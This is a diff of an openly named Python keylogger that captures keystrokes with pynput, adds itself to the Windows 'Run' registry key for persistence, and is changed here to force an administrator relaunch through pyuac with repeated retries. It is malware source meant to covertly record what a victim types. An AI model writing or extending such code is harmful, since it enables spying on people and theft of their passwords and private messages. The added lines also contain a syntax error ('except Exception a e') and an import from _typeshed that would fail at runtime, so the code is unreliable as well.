@@ -1,33 +1,18 @@
 
+from _typeshed import ExcInfo
 from pynput import keyboard
 from pynput.keyboard import Listener
 from datetime import datetime
-import winreg 
-import threading
-import time
-import ctypes
 import os
 import sys
-
+import pyuac
+# pip install pypiwin32
 class Keylogger:
 
     def __init__(self):
         self.log = "Keylogger started ..."
 
     # this are primary methods which should be done
-
-    def runAsAdmin(self):
-        while True:
-            ans = ctypes.windll.shell32.IsUserAnAdmin()
-            if ans == 0:
-                ctypes.windll.shell32.ShellExecuteW(None, "runas",
-                                                    sys.executable, 
-                                                    "".join(sys.argv),
-                                                    None, 1)
-            else:
-                break
-
-
     def addToStartup(self):
         scriptPath = os.path.abspath(sys.argv[0])
         key = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -70,9 +55,21 @@ class Keylogger:
 
 
 
+
 if __name__ == "__main__":
-    logger = Keylogger()
-    logger.run()
+    if not pyuac.isUserAdmin():
+        print("Re-launching as admin!")
+        try:
+            pyuac.runAsAdmin()
+        except Exception a e:
+            try:
+                pyuac.runAsAdmin()
+            except:
+                pass
+
+    obj = Keylogger()
+    obj.run()
+        
 
 
 
